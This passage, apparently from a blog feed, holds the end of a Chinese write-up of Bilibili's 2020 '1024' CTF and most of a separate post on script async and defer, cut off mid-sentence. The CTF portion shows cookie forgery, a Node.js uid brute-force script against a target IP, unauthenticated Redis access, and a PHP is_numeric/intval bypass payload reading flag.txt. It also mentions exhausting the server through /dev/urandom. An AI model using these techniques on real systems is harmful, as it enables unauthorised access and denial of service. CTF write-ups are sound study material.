改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 